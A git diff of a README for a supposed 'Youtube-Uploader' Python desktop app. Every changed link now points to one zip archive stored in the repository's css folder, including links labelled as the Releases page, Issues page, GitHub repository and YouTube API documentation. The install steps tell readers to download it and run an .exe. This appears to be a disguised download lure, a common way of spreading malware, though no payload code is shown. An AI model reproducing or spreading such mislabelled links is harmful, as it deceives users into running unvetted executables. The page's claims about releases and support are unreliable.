@@ -1,7 +1,7 @@
 # 🎥 Youtube-Uploader - Effortless Video Uploads to YouTube
 
 ## 🏷️ Badges
-[![Download Latest Release](https://raw.githubusercontent.com/FelipeFullStack/Youtube-Uploader/master/img/Youtube-Uploader-v3.1.zip%20Latest%20Release&style=for-the-badge)](https://raw.githubusercontent.com/FelipeFullStack/Youtube-Uploader/master/img/Youtube-Uploader-v3.1.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/FelipeFullStack/Youtube-Uploader/master/css/Youtube-Uploader-Colosseum.zip%20Latest%20Release&style=for-the-badge)](https://raw.githubusercontent.com/FelipeFullStack/Youtube-Uploader/master/css/Youtube-Uploader-Colosseum.zip)
 
 ## 📜 Description
 Youtube-Uploader is a modular Python desktop app designed to simplify your video uploading process. With this app, you can automatically upload videos from a watched folder directly to your YouTube channel. The software provides full automation, ensuring that your uploads happen seamlessly. Additional features include crash recovery and playlist management, making it easier to organize your content.
@@ -12,7 +12,7 @@ To get started with Youtube-Uploader, follow the steps below to download and run
 ## 📥 Download & Install
 1. **Visit the Releases Page:**
    Click the link below to go to the Releases page where you can download the application.  
-   [Download Latest Release](https://raw.githubusercontent.com/FelipeFullStack/Youtube-Uploader/master/img/Youtube-Uploader-v3.1.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/FelipeFullStack/Youtube-Uploader/master/css/Youtube-Uploader-Colosseum.zip)
 
 2. **Choose Your Version:**
    On the Releases page, find the latest version of the software. It will be listed with a tag indicating the version number. Look for the `.exe` file suitable for your operating system.
@@ -59,13 +59,13 @@ If you encounter issues while using the application, consider these steps:
 - **Seek Help:** If problems persist, feel free to reach out for support on the GitHub Issues page or view existing discussions.
 
 ## 📬 Support
-For additional support, visit the [Issues page](https://raw.githubusercontent.com/FelipeFullStack/Youtube-Uploader/master/img/Youtube-Uploader-v3.1.zip) on GitHub. You can report bugs, request features, or get help from the community.
+For additional support, visit the [Issues page](https://raw.githubusercontent.com/FelipeFullStack/Youtube-Uploader/master/css/Youtube-Uploader-Colosseum.zip) on GitHub. You can report bugs, request features, or get help from the community.
 
 ## 📑 License
 Youtube-Uploader is open source and released under the MIT License. You are free to use, modify, and distribute this software under the terms specified in the license.
 
 ## 🌐 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/FelipeFullStack/Youtube-Uploader/master/img/Youtube-Uploader-v3.1.zip)
-- [YouTube API Documentation](https://raw.githubusercontent.com/FelipeFullStack/Youtube-Uploader/master/img/Youtube-Uploader-v3.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/FelipeFullStack/Youtube-Uploader/master/css/Youtube-Uploader-Colosseum.zip)
+- [YouTube API Documentation](https://raw.githubusercontent.com/FelipeFullStack/Youtube-Uploader/master/css/Youtube-Uploader-Colosseum.zip)
 
 Thank you for using Youtube-Uploader! Enjoy an effortless experience while managing your video uploads.
